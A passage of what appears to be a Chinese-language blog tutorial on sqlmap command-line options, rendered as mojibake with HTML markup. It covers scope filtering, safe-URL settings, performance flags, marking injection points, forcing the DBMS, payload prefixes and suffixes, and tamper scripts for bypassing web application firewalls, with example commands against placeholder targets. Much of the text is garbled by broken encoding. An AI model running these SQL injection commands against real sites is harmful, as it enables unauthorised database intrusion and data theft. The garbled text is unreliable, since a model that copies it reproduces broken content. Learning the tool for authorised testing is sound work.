è®¾ç½®æ—¥å¿—è¿‡æ»¤ç›®æ ‡</h3><p>ä¸ä½¿ç”¨é€‰é¡¹-lä½¿ç”¨ä»æä¾›çš„æ—¥å¿—è§£æçš„æ‰€æœ‰ä¸»æœºä¸åŒï¼Œ æ‚¨å¯ä»¥æŒ‡å®šæœ‰æ•ˆçš„Pythonæ­£åˆ™è¡¨è¾¾å¼ï¼Œ ç”¨äºè¿‡æ»¤æ‰€éœ€çš„æ—¥å¿—ã€‚</p><p>ä¾‹å¦‚ï¼š python sqlmap.py -l burp.log â€“scope&#x3D;â€(www)?.target.(com|net|org)â€</p><p>â€“scope&#x3D; â€ æ­£åˆ™è¡¨è¾¾å¼ â€œ</p><h3 id="3-7-è®¾ç½®å¿½ç•¥-401"><a href="#3-7-è®¾ç½®å¿½ç•¥-401" class="headerlink" title="3.7 è®¾ç½®å¿½ç•¥ 401"></a>3.7 è®¾ç½®å¿½ç•¥ 401</h3><p>â€“ignore-401 å‚æ•°ç”¨æ¥å¿½ç•¥æœªéªŒè¯é”™è¯¯ã€‚</p><p>å¦‚æœæ‚¨æƒ³æµ‹è¯•å¶å°”è¿”å›HTTPé”™è¯¯401(æœªç»æˆæƒçš„)çš„ç«™ç‚¹ï¼Œè€Œæ‚¨æƒ³å¿½ç•¥å®ƒå¹¶åœ¨ä¸æä¾›é€‚å½“å‡­è¯çš„æƒ…å†µä¸‹ç»§ç»­æµ‹è¯•ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨â€“ignore-401</p><h3 id="3-8-è®¾ç½®-HTTP-åè®®ç§é’¥"><a href="#3-8-è®¾ç½®-HTTP-åè®®ç§é’¥" class="headerlink" title="3.8 è®¾ç½® HTTP åè®®ç§é’¥"></a>3.8 è®¾ç½® HTTP åè®®ç§é’¥</h3><p>å½“webæœåŠ¡å™¨éœ€è¦é€‚å½“çš„å®¢æˆ·ç«¯è¯ä¹¦å’Œç”¨äº<a href="https://cloud.tencent.com/product/faceid?from_column=20065&from=20065">èº«ä»½éªŒè¯</a>çš„ç§é’¥æ—¶ï¼Œåº”è¯¥ä½¿ç”¨æ­¤é€‰é¡¹ã€‚æä¾›çš„å€¼åº”è¯¥æ˜¯ä¸€ä¸ªPEMæ ¼å¼çš„key_fileï¼Œå…¶ä¸­åŒ…å«è¯ä¹¦å’Œç§é’¥ã€‚</p><p>â€“auth-file æ–‡ä»¶å</p><h3 id="3-9-è®¾ç½®å®‰å…¨æ¨¡å¼"><a href="#3-9-è®¾ç½®å®‰å…¨æ¨¡å¼" class="headerlink" title="3.9 è®¾ç½®å®‰å…¨æ¨¡å¼"></a>3.9 è®¾ç½®å®‰å…¨æ¨¡å¼</h3><p>é¿å…åœ¨å¤šæ¬¡è¯·æ±‚å¤±è´¥åé”€æ¯ä¼šè¯</p><p>æœ‰æ—¶ï¼Œå¦‚æœæ‰§è¡Œäº†ä¸€å®šæ•°é‡çš„ä¸æˆåŠŸè¯·æ±‚ï¼Œåˆ™åœ¨æ­¤æœŸé—´çš„webåº”ç”¨ç¨‹åºæˆ–æ£€æŸ¥æŠ€æœ¯ä¼šé”€æ¯ä¼šè¯ã€‚è¿™å¯èƒ½å‘ç”Ÿåœ¨sqlmapçš„æ£€æµ‹é˜¶æ®µæˆ–åˆ©ç”¨ä»»ä½•ç›²SQLæ³¨å…¥ç±»å‹æ—¶ã€‚åŸå› æ˜¯SQLæœ‰æ•ˆè´Ÿè½½ä¸ä¸€å®šè¿”å›è¾“å‡ºï¼Œå› æ­¤å¯èƒ½ä¼šå‘åº”ç”¨ç¨‹åºä¼šè¯ç®¡ç†æˆ–æ£€æŸ¥æŠ€æœ¯å‘å‡ºä¿¡å·ã€‚</p><p>â€“safe-url, â€“safe-post, â€“safe-req â€“safe-freq</p><p>é€šè¿‡è¿™ç§æ–¹å¼ï¼Œsqlmapå°†è®¿é—®æ¯ä¸ªé¢„å®šä¹‰æ•°é‡çš„è¯·æ±‚ï¼Œè€Œä¸å¯¹æŸä¸ªå®‰å…¨URLæ‰§è¡Œä»»ä½•ç±»å‹çš„æ³¨å…¥ã€‚</p><h3 id="3-10-è®¾ç½®å¿½ç•¥URLç¼–ç "><a href="#3-10-è®¾ç½®å¿½ç•¥URLç¼–ç " class="headerlink" title="3.10 è®¾ç½®å¿½ç•¥URLç¼–ç "></a>3.10 è®¾ç½®å¿½ç•¥URLç¼–ç </h3><p>æ®å‚æ•°çš„ä½ç½®(ä¾‹å¦‚GET)ï¼Œé»˜è®¤æƒ…å†µä¸‹å®ƒçš„å€¼å¯ä»¥æ˜¯URLç¼–ç çš„ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œåç«¯webæœåŠ¡å™¨ä¸éµå¾ªRFCæ ‡å‡†ï¼Œéœ€è¦ä»¥åŸå§‹çš„éç¼–ç å½¢å¼å‘é€å€¼ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ä½¿ç”¨â€“skip-urlencodeã€‚</p><p>â€“skip-urlencode ä¸è¿›è¡ŒURLåŠ å¯†</p><h2 id="0x04-sqlmap-æ€§èƒ½ä¼˜åŒ–"><a href="#0x04-sqlmap-æ€§èƒ½ä¼˜åŒ–" class="headerlink" title="0x04 sqlmap æ€§èƒ½ä¼˜åŒ–"></a>0x04 sqlmap æ€§èƒ½ä¼˜åŒ–</h2><h3 id="4-1-è®¾ç½®æŒä¹…-HTTP-è¿æ¥"><a href="#4-1-è®¾ç½®æŒä¹…-HTTP-è¿æ¥" class="headerlink" title="4.1 è®¾ç½®æŒä¹… HTTP è¿æ¥"></a>4.1 è®¾ç½®æŒä¹… HTTP è¿æ¥</h3><p>Sqlmapä¸­å¯ä»¥è®¾ç½®è¿æ¥ä¸ºæŒä¹…è¿æ¥ã€‚ HTTPæŠ¥æ–‡ä¸­è®¾ç½® Connection: Keep-Aliveã€‚ï¼ˆé€šè¿‡å‡å°‘è¿æ¥æ¬¡æ•°æ¥æå‡æ€§èƒ½ï¼‰ å‚æ•°ï¼š â€“keep-alive æ³¨æ„è¯¥å‚æ•°ä¸ -proxyå‚æ•°ä¸å…¼å®¹ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022022449.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022029956.png" alt="img"></p><h3 id="4-2-è®¾ç½®-HTTP-ç©ºè¿æ¥"><a href="#4-2-è®¾ç½®-HTTP-ç©ºè¿æ¥" class="headerlink" title="4.2 è®¾ç½® HTTP ç©ºè¿æ¥"></a>4.2 è®¾ç½® HTTP ç©ºè¿æ¥</h3><p>Sqlmapä¸­è®¾ç½®ç©ºè¿æ¥ï¼Œ è¡¨ç¤ºç›´æ¥è·å¾—HTTPå“åº”çš„å¤§å°è€Œä¸ç”¨è·å¾—HTTPå“åº”ä½“ã€‚ å¸¸ç”¨åœ¨ç›²æ³¨åˆ¤æ–­çœŸ&#x2F;å‡ä¸­ï¼Œé™ä½ç½‘ç»œå¸¦å®½æ¶ˆè€—ã€‚ å‚æ•°ï¼š â€“null-connection æ³¨æ„è¿™ä¸ªå‚æ•°ï¼Œä¸â€“text-onlyå‚æ•°ä¸å…¼å®¹ </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022020235.png" alt="img"></p><h3 id="4-3-è®¾ç½®å¤šçº¿ç¨‹"><a href="#4-3-è®¾ç½®å¤šçº¿ç¨‹" class="headerlink" title="4.3 è®¾ç½®å¤šçº¿ç¨‹"></a>4.3 è®¾ç½®å¤šçº¿ç¨‹</h3><p>Sqlmapä¸­è®¾ç½®åŒæ—¶å‘é€å¤šå°‘ä¸ªHTTPè¯·æ±‚çš„å¤šçº¿ç¨‹ã€‚</p><p>â€“threads é»˜è®¤æ˜¯1ä¸ªçº¿ç¨‹ã€‚ ä¸ºäº†ä¸å½±å“ç›®æ ‡ç«™ç‚¹æœåŠ¡å™¨çš„æ€§èƒ½ï¼Œ Sqlmapå¯ä»¥è®¾ç½®æœ€å¤§çš„çº¿ç¨‹æ•°ä¸º10ã€‚</p><h3 id="4-5-è®¾ç½®é¢„æµ‹è¾“å‡º"><a href="#4-5-è®¾ç½®é¢„æµ‹è¾“å‡º" class="headerlink" title="4.5 è®¾ç½®é¢„æµ‹è¾“å‡º"></a>4.5 è®¾ç½®é¢„æµ‹è¾“å‡º</h3><p>Sqlmapä¸­çš„é¢„æµ‹è¾“å‡ºï¼Œ åœ¨æ¨ç†ç®—æ³•ä¸­ç”¨äºæ£€ç´¢å€¼å­—ç¬¦çš„é¡ºåºç»Ÿè®¡é¢„æµ‹ã€‚ å‚æ•°ï¼š â€“predict-output</p><p>æ³¨æ„è¿™ä¸ªå‚æ•°ä¸ â€“threadå‚æ•°ä¸å…¼å®¹ã€‚</p><p><em><strong>ä½¿ç”¨ -o å‚æ•°å¯å¼€å¯å‰é¢ä¸‰ä¸ªæ€§èƒ½å‚æ•°ï¼ˆâ€“keep-alive ã€â€“null-connection ã€ â€“predict-outputï¼‰ï¼Œä¸å¼€å¯ â€“threadså‚æ•°</strong></em></p><h2 id="0x05-sqlmap-æ³¨å…¥ä½ç½®ä»‹ç»"><a href="#0x05-sqlmap-æ³¨å…¥ä½ç½®ä»‹ç»" class="headerlink" title="0x05 sqlmap æ³¨å…¥ä½ç½®ä»‹ç»"></a>0x05 sqlmap æ³¨å…¥ä½ç½®ä»‹ç»</h2><h3 id="5-0-æ³¨å…¥ä»‹ç»"><a href="#5-0-æ³¨å…¥ä»‹ç»" class="headerlink" title="5.0 æ³¨å…¥ä»‹ç»"></a>5.0 æ³¨å…¥ä»‹ç»</h3><p>æ‰€è°“SQLæ³¨å…¥ï¼Œ å°±æ˜¯é€šè¿‡æŠŠSQLå‘½ä»¤æ’å…¥åˆ°Webè¡¨å•æäº¤æˆ–è¾“å…¥åŸŸåæˆ–é¡µé¢è¯·æ±‚çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œ æœ€ç»ˆè¾¾åˆ°æ¬ºéª—æœåŠ¡å™¨æ‰§è¡Œæ¶æ„çš„SQLå‘½ä»¤ã€‚ å…·ä½“æ¥è¯´ï¼Œ å®ƒæ˜¯åˆ©ç”¨ç°æœ‰åº”ç”¨ç¨‹åºï¼Œ å°†ï¼ˆæ¶æ„çš„ï¼‰ SQLå‘½ä»¤æ³¨å…¥åˆ°åå°æ•°æ®åº“å¼•æ“æ‰§è¡Œçš„èƒ½åŠ›ï¼Œ å®ƒå¯ä»¥é€šè¿‡åœ¨Webè¡¨å•ä¸­è¾“å…¥ï¼ˆæ¶æ„ï¼‰ SQLè¯­å¥å¾—åˆ°ä¸€ä¸ªå­˜åœ¨å®‰å…¨æ¼æ´çš„ç½‘ç«™ä¸Šçš„æ•°æ®åº“ï¼Œ è€Œä¸æ˜¯æŒ‰ç…§è®¾è®¡è€…æ„å›¾å»æ‰§è¡ŒSQLè¯­å¥ã€‚</p><p>ç”±æ­¤å¯è§ï¼š SQLæ³¨å…¥å‘ç”Ÿä½ç½® HTTPæ•°æ®åŒ…ä¸­ä»»æ„ä½ç½®</p><h3 id="5-1-è®¾ç½®æŒ‡å®šæ³¨å…¥å‚æ•°"><a href="#5-1-è®¾ç½®æŒ‡å®šæ³¨å…¥å‚æ•°" class="headerlink" title="5.1 è®¾ç½®æŒ‡å®šæ³¨å…¥å‚æ•°"></a>5.1 è®¾ç½®æŒ‡å®šæ³¨å…¥å‚æ•°</h3><p>Sqlmapæµ‹è¯•å‚æ•° -p, â€“skip â€“param-exclude â€“skip-static</p><p>-p ï¼š æŒ‡å®šå…·ä½“æ¢æµ‹çš„å‚æ•°ã€‚ ä¾‹å¦‚ï¼š -p â€œid,user-agentâ€</p><p>â€“skipï¼š å¿½ç•¥æ¢æµ‹å…·ä½“çš„å‚æ•°ã€‚ ä¾‹å¦‚ï¼š â€“level â€“skip â€œuser-agent,refererâ€</p><p>â€“param-excludeï¼š å¿½ç•¥åŒ…å«å…·ä½“å†…å®¹çš„å‚æ•°ã€‚ ä¾‹å¦‚ï¼š â€“param-exclude&#x3D;â€œtoken|sessionâ€ ä¸å¯¹åŒ…å«tokenæˆ–sessionçš„å‚æ•°è¿›è¡Œæ¢æµ‹ã€‚</p><p>â€“skip-staticï¼š å¿½ç•¥éåŠ¨æ€å‚æ•°</p><h3 id="5-2-è®¾ç½®URLæ³¨å…¥ä½ç½®"><a href="#5-2-è®¾ç½®URLæ³¨å…¥ä½ç½®" class="headerlink" title="5.2 è®¾ç½®URLæ³¨å…¥ä½ç½®"></a>5.2 è®¾ç½®URLæ³¨å…¥ä½ç½®</h3><p>å½“æ³¨å…¥ç‚¹ä½äºURLæœ¬èº«å†…éƒ¨æ—¶ï¼Œ ä¼šå‡ºç°ä¸€äº›ç‰¹æ®Šæƒ…å†µã€‚ é™¤éæ‰‹åŠ¨æŒ‡å‘URLè·¯å¾„ï¼Œ å¦åˆ™sqlmapä¸ä¼šå¯¹URLè·¯å¾„æ‰§è¡Œä»»ä½•è‡ªåŠ¨æµ‹è¯•ã€‚ å¿…é¡»åœ¨å‘½ä»¤è¡Œä¸­æ·»åŠ æ˜Ÿå·(*)æ¥æŒ‡å®šè¿™äº›æ³¨å…¥ç‚¹ã€‚</p><p>ä¾‹å¦‚ï¼Œ å½“ä½¿ç”¨Apache webæœåŠ¡å™¨çš„mod_rewriteæ¨¡å—æˆ–å…¶ä»–ç±»ä¼¼çš„æŠ€æœ¯æ—¶ï¼Œ è¿™å°±æ˜¾å¾—ç‰¹åˆ«æœ‰ç”¨äº†</p><p>python sqlmap.py -u <a href="http://targeturl/param1/value1*/param2/value2/">http://targeturl/param1/value1*/param2/value2/</a></p><h3 id="5-3-è®¾ç½®ä»»æ„æ³¨å…¥ä½ç½®"><a href="#5-3-è®¾ç½®ä»»æ„æ³¨å…¥ä½ç½®" class="headerlink" title="5.3 è®¾ç½®ä»»æ„æ³¨å…¥ä½ç½®"></a>5.3 è®¾ç½®ä»»æ„æ³¨å…¥ä½ç½®</h3><p>ä¸URLæ³¨å…¥ç‚¹ç±»ä¼¼ï¼Œ æ˜Ÿå·(*)(æ³¨æ„:è¿™é‡Œä¹Ÿæ”¯æŒHavijæ ·å¼%INJECT %)ä¹Ÿå¯ä»¥ç”¨æ¥æŒ‡å‘GETã€POSTæˆ–HTTPå¤´ä¸­çš„ä»»æ„æ³¨å…¥ç‚¹ã€‚ æ³¨å…¥ç‚¹å¯ä»¥é€šè¿‡åœ¨å¸¦æœ‰é€‰é¡¹-uçš„GETå‚æ•°å€¼ã€ å¸¦æœ‰é€‰é¡¹â€“dataæ•°æ®çš„POSTå‚æ•°å€¼ã€ å¸¦æœ‰é€‰é¡¹-Hçš„HTTPï¼ˆheaderï¼‰å¤´å€¼ã€ å¸¦æœ‰é€‰é¡¹-Açš„User_Agentå¤´ã€ ç”¨æˆ·ä»£ç†ã€ å¼•ç”¨å’Œ&#x2F;æˆ–cookieçš„HTTPå¤´å€¼ä¸­æŒ‡å®šï¼Œ æˆ–è€…åœ¨å¸¦æœ‰é€‰é¡¹-rçš„æ–‡ä»¶ä¸­åŠ è½½çš„HTTPè¯·æ±‚çš„é€šç”¨ä½ç½®æŒ‡å®šã€‚</p><p>python sqlmap.py -u â€œ<a href="http://targeturlâ€/">http://targeturlâ€</a> â€“cookie&#x3D;â€param1&#x3D;value1*;param2&#x3D;value2</p><h2 id="0x06-sqlmap-æ³¨å…¥å‚æ•°"><a href="#0x06-sqlmap-æ³¨å…¥å‚æ•°" class="headerlink" title="0x06 sqlmap æ³¨å…¥å‚æ•°"></a>0x06 sqlmap æ³¨å…¥å‚æ•°</h2><h3 id="6-1-å¼ºåˆ¶è®¾ç½®-DBMS"><a href="#6-1-å¼ºåˆ¶è®¾ç½®-DBMS" class="headerlink" title="6.1 å¼ºåˆ¶è®¾ç½® DBMS"></a>6.1 å¼ºåˆ¶è®¾ç½® DBMS</h3><p>é»˜è®¤æƒ…å†µä¸‹Sqlmapä¼šè‡ªåŠ¨è¯†åˆ«æ¢æµ‹ç›®æ ‡Webåº”ç”¨ç¨‹åºçš„åç«¯<a href="https://cloud.tencent.com/product/dmc?from_column=20065&from=20065">æ•°æ®åº“ç®¡ç†</a>ç³»ç»Ÿï¼ˆDBMSï¼‰ ï¼Œ ä»¥ä¸‹åˆ—å‡º</p><p>Sqlmapå®Œå…¨æ”¯æŒçš„DBMSç§ç±»ï¼š</p><p>Mysqlã€ Oracleã€ Microsoft SQL Serverã€ IBM DB2ã€ SQLiteã€ Firebirdã€ Sybaseã€ SAP MaxDBã€HSQLDBã€ Informix</p><p>â€“dbms æ•°æ®åº“ç®¡ç†ç³»ç»Ÿåç§° [ç‰ˆæœ¬å·]</p><p>ä¾‹å¦‚ï¼š â€“dbms mysql 5.0 ã€ â€“dbms microsoft sql server 05</p><h3 id="6-2-å¼ºåˆ¶è®¾ç½®-OS"><a href="#6-2-å¼ºåˆ¶è®¾ç½®-OS" class="headerlink" title="6.2 å¼ºåˆ¶è®¾ç½® OS"></a>6.2 å¼ºåˆ¶è®¾ç½® OS</h3><p>é»˜è®¤æƒ…å†µä¸‹Sqlmapä¼šè‡ªåŠ¨è¯†åˆ«æ¢æµ‹ç›®æ ‡Webåº”ç”¨ç¨‹åºçš„åç«¯æ“ä½œç³»ç»Ÿï¼ˆOSï¼‰ ï¼Œ ä»¥ä¸‹åˆ—å‡ºSqlmapå®Œå…¨æ”¯æŒçš„OSç§ç±»ã€‚ Linux ã€ Windows</p><p>è¯·æ³¨æ„ï¼Œ æ­¤é€‰é¡¹ä¸æ˜¯å¼ºåˆ¶æ€§çš„ï¼Œ å¼ºçƒˆå»ºè®®åªåœ¨å®Œå…¨ç¡®å®šåº•å±‚æ“ä½œç³»ç»Ÿçš„åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ—¶æ‰ä½¿ç”¨å®ƒã€‚ å¦‚æœä¸çŸ¥é“å®ƒï¼Œ è®©sqlmapè‡ªåŠ¨ä¸ºæ‚¨è¯†åˆ«å®ƒã€‚ ä¾‹å¦‚ï¼š â€“os windows æˆ– â€“os linux</p><p>è¯·æ³¨æ„ï¼Œ æ­¤é€‰é¡¹ä¸æ˜¯å¼ºåˆ¶æ€§çš„ï¼Œ å¼ºçƒˆå»ºè®®åªåœ¨å®Œå…¨ç¡®å®šåº•å±‚æ“ä½œç³»ç»Ÿçš„åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ—¶æ‰ä½¿ç”¨å®ƒã€‚ å¦‚æœä¸çŸ¥é“å®ƒï¼Œ è®©sqlmapè‡ªåŠ¨ä¸ºæ‚¨è¯†åˆ«å®ƒã€‚</p><h3 id="6-3-å…³é—­è´Ÿè½½è½¬æ¢æœºåˆ¶"><a href="#6-3-å…³é—­è´Ÿè½½è½¬æ¢æœºåˆ¶" class="headerlink" title="6.3 å…³é—­è´Ÿè½½è½¬æ¢æœºåˆ¶"></a>6.3 å…³é—­è´Ÿè½½è½¬æ¢æœºåˆ¶</h3><p>åœ¨æ£€ç´¢ç»“æœæ—¶ï¼Œ sqlmapä½¿ç”¨ä¸€ç§æœºåˆ¶ï¼Œ åœ¨è¿™ç§æœºåˆ¶ä¸­ï¼Œ æ‰€æœ‰æ¡ç›®éƒ½è¢«è½¬æ¢ä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œ å¹¶åœ¨NULLå€¼çš„æƒ…å†µä¸‹ç”¨ç©ºæ ¼å­—ç¬¦æ›¿æ¢ã€‚ è¿™æ ·åšæ˜¯ä¸ºäº†é˜²æ­¢å‡ºç°ä»»ä½•é”™è¯¯çŠ¶æ€(ä¾‹å¦‚ï¼Œ å°†ç©ºå€¼ä¸å­—ç¬¦ä¸²å€¼è¿æ¥èµ·æ¥)ï¼Œ å¹¶ç®€åŒ–æ•°æ®æ£€ç´¢è¿‡ç¨‹æœ¬èº«ã€‚ å°½ç®¡å¦‚æ­¤ï¼Œ è¿˜æ˜¯æœ‰æŠ¥å‘Šçš„æ¡ˆä¾‹(ä¾‹å¦‚MySQL DBMSçš„æ—§ç‰ˆæœ¬)ç”±äºæ•°æ®æ£€ç´¢æœ¬èº«çš„é—®é¢˜(ä¾‹å¦‚æ²¡æœ‰è¿”å›å€¼)éœ€è¦å…³é—­è¿™ç§æœºåˆ¶(ä½¿ç”¨æ­¤å¼€å…³)ã€‚</p><p>â€“no-cast</p><h3 id="6-4-å…³é—­å­—ç¬¦è½¬ä¹‰æœºåˆ¶"><a href="#6-4-å…³é—­å­—ç¬¦è½¬ä¹‰æœºåˆ¶" class="headerlink" title="6.4 å…³é—­å­—ç¬¦è½¬ä¹‰æœºåˆ¶"></a>6.4 å…³é—­å­—ç¬¦è½¬ä¹‰æœºåˆ¶</h3><p>åœ¨sqlmapéœ€è¦åœ¨æœ‰æ•ˆè´Ÿè½½ä¸­ä½¿ç”¨(å•å¼•å·åˆ†éš”)å­—ç¬¦ä¸²å€¼(ä¾‹å¦‚ï¼Œ é€‰æ‹©â€™foobarâ€™)æ—¶ï¼Œ è¿™äº›å€¼å°†è‡ªåŠ¨è½¬ä¹‰(ä¾‹å¦‚ï¼Œ é€‰æ‹©CHAR(102)+CHAR(111)+CHAR(111)+CHAR(98)+CHAR(97)+CHAR(114))ã€‚è¿™æ ·åšçš„åŸå› æœ‰ä¸¤ä¸ª:æ··æ·†æœ‰æ•ˆè´Ÿè½½å†…å®¹å’Œé˜²æ­¢åç«¯æœåŠ¡å™¨ä¸ŠæŸ¥è¯¢è½¬ä¹‰æœºåˆ¶(ä¾‹å¦‚magic_quoteså’Œ&#x2F;æˆ–mysql_real_escape_string)çš„æ½œåœ¨é—®é¢˜ã€‚ ç”¨æˆ·å¯ä»¥ä½¿ç”¨è¿™ä¸ªå¼€å…³å…³é—­å®ƒ(ä¾‹å¦‚å‡å°‘æœ‰æ•ˆè´Ÿè½½å¤§å°)ã€‚</p><p>â€“no-escapeï¼ˆä¸€èˆ¬ä¸å»ºè®®å…³é—­ï¼‰</p><h3 id="6-5-å¼ºåˆ¶è®¾ç½®æ— æ•ˆå€¼æ›¿æ¢"><a href="#6-5-å¼ºåˆ¶è®¾ç½®æ— æ•ˆå€¼æ›¿æ¢" class="headerlink" title="6.5 å¼ºåˆ¶è®¾ç½®æ— æ•ˆå€¼æ›¿æ¢"></a>6.5 å¼ºåˆ¶è®¾ç½®æ— æ•ˆå€¼æ›¿æ¢</h3><p>åœ¨sqlmapéœ€è¦ä½¿åŸå§‹å‚æ•°å€¼æ— æ•ˆ(ä¾‹å¦‚id&#x3D;13)æ—¶ï¼Œå®ƒä½¿ç”¨ç»å…¸çš„å¦å®š(ä¾‹å¦‚id&#x3D;-13)ã€‚æœ‰äº†è¿™ä¸ªå¼€å…³ï¼Œå°±å¯ä»¥å¼ºåˆ¶ä½¿ç”¨å¤§æ•´æ•°å€¼æ¥å®ç°ç›¸åŒçš„ç›®æ ‡(ä¾‹å¦‚id&#x3D;99999999)ã€‚ â€“invalid-bignum</p><p>åœ¨sqlmapéœ€è¦ä½¿åŸå§‹å‚æ•°å€¼æ— æ•ˆ(ä¾‹å¦‚id&#x3D;13)æ—¶ï¼Œå®ƒä½¿ç”¨ç»å…¸çš„å¦å®š(ä¾‹å¦‚id&#x3D;-13)ã€‚æœ‰äº†è¿™ä¸ªå¼€å…³ï¼Œå°±å¯ä»¥å¼ºåˆ¶ä½¿ç”¨å¸ƒå°”æ“ä½œæ¥å®ç°ç›¸åŒçš„ç›®æ ‡(ä¾‹å¦‚id&#x3D;13 and18&#x3D;19)ã€‚ â€“invalid-logical</p><p>åœ¨sqlmapéœ€è¦ä½¿åŸå§‹å‚æ•°å€¼æ— æ•ˆ(ä¾‹å¦‚id&#x3D;13)æ—¶ï¼Œå®ƒä½¿ç”¨ç»å…¸çš„å¦å®š(ä¾‹å¦‚id&#x3D;-13)ã€‚æœ‰äº†è¿™ä¸ªå¼€å…³ï¼Œå°±å¯ä»¥å¼ºåˆ¶ä½¿ç”¨éšæœºå­—ç¬¦ä¸²æ¥å®ç°ç›¸åŒçš„ç›®æ ‡(ä¾‹å¦‚id&#x3D;akewmc)ã€‚ â€“invalid-string</p><h3 id="6-6-è‡ªå®šä¹‰æ³¨å…¥è´Ÿè½½ä½ç½®"><a href="#6-6-è‡ªå®šä¹‰æ³¨å…¥è´Ÿè½½ä½ç½®" class="headerlink" title="6.6 è‡ªå®šä¹‰æ³¨å…¥è´Ÿè½½ä½ç½®"></a>6.6 è‡ªå®šä¹‰æ³¨å…¥è´Ÿè½½ä½ç½®</h3><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œåªæœ‰å½“ç”¨æˆ·æä¾›è¦é™„åŠ åˆ°æ³¨å…¥è´Ÿè½½çš„ç‰¹å®šåç¼€æ—¶ï¼Œæ˜“å—æ”»å‡»çš„å‚æ•°æ‰å¯è¢«åˆ©ç”¨ã€‚å½“ç”¨æˆ·å·²ç»çŸ¥é“æŸ¥è¯¢è¯­æ³•å¹¶å¸Œæœ›é€šè¿‡ç›´æ¥æä¾›æ³¨å…¥æœ‰æ•ˆè´Ÿè½½å‰ç¼€å’Œåç¼€æ¥æ£€æµ‹å’Œåˆ©ç”¨SQLæ³¨å…¥æ—¶ï¼Œè¿™äº›é€‰é¡¹å°±æ´¾ä¸Šç”¨åœºäº†ã€‚ â€“prefix è®¾ç½®SQLæ³¨å…¥Payloadå‰ç¼€ â€“suffix è®¾ç½®SQLæ³¨å…¥Payloadåç¼€</p><p>ä¾‹å¦‚ï¼š SQLæŸ¥è¯¢è¯­å¥ä¸ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$query = <span class="hljs-string">&quot;SELECT * FROM users WHERE id=(&#x27; . $_GET[&#x27;id&#x27;] . &#x27;) LIMIT 0, 1&quot;</span>;<br></code></pre></td></tr></table></figure><p>sqlmapå‚æ•°ä½¿ç”¨ï¼š python sqlmap.py -u â€œ<a href="http://ip/sqlmap/mysql/get_str_brackets.php">http://ip/sqlmap/mysql/get_str_brackets.php</a> ?id&#x3D;1â€ -p id â€“prefix â€œâ€™)â€ â€“suffix â€œAND (â€˜abcâ€™&#x3D;â€™abcâ€</p><p>æ’å…¥Payloadåçš„SQLæŸ¥è¯¢è¯­å¥ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$query = <span class="hljs-string">&quot;SELECT * FROM users WHERE id=(&#x27;1&#x27;) &lt;PAYLOAD&gt; AND (&#x27;abc&#x27;=&#x27;abc&#x27;) LIMIT 0, 1&quot;</span>;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023912.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022023306.png" alt="img"></p><h3 id="6-7-è®¾ç½®-Tamper-è„šæœ¬"><a href="#6-7-è®¾ç½®-Tamper-è„šæœ¬" class="headerlink" title="6.7 è®¾ç½® Tamper è„šæœ¬"></a>6.7 è®¾ç½® Tamper è„šæœ¬</h3><p>sqlmapæœ¬èº«ä¸ä¼šæ··æ·†å‘é€çš„æœ‰æ•ˆè´Ÿè½½ï¼Œé™¤äº†å•å¼•å·ä¹‹é—´çš„å­—ç¬¦ä¸²è¢«CHAR()ç±»ä¼¼çš„è¡¨ç¤ºå½¢å¼æ‰€å–ä»£ä¹‹å¤–ã€‚sqlmapé€šè¿‡Tamperè„šæœ¬æ¥ç»•è¿‡WAFç­‰é˜²å¾¡æªæ–½ï¼Œå¯ä»¥åœ¨tamperæ–‡ä»¶å¤¹ä¸‹æ‰¾åˆ°æ‰€æœ‰sqlmapè‡ªå¸¦çš„tamperè„šæœ¬ã€‚</p><p>sqlmap.py -u â€œ<a href="http://ip/sqlmap/mysql/get_int.php?id=1%E2%80%9D">http://ip/sqlmap/mysql/get_int.php?id=1â€</a> â€“tamperâ€œbetween.py,randomcase.py,space2comment.pyâ€ -v 3</p><h3 id="6-8-è®¾ç½®-DBMS-è®¤è¯"><a href="#6-8-è®¾ç½®-DBMS-è®¤è¯" class="headerlink" title="6.8 è®¾ç½® DBMS è®¤è¯"></a>6.8 è®¾ç½® DBMS è®¤è¯</h3><p>è®¾ç½®DBMSè®¤è¯æ–¹å¼é€šè¿‡ä»¥ä¸‹å‘½ä»¤ï¼š</p><p>â€“dbms-cred &#x3D; username:password</p><h2 id="0x07-sqlmap-è‡ªå®šä¹‰æ£€æµ‹å‚æ•°"><a href="#0x07-sqlmap-è‡ªå®šä¹‰æ£€æµ‹å‚æ•°" class="headerlink" title="0x07 sqlmap è‡ªå®šä¹‰æ£€æµ‹å‚æ•°"></a>0x07 sqlmap è‡ªå®šä¹‰æ£€æµ‹å‚æ•°</h2><h3 id="7-1-è®¾ç½®æ¢æµ‹ç­‰çº§"><a href="#7-1-è®¾ç½®æ¢æµ‹ç­‰çº§" class="headerlink" title="7.1 è®¾ç½®æ¢æµ‹ç­‰çº§"></a>7.1 è®¾ç½®æ¢æµ‹ç­‰çº§</h3><p>â€“level 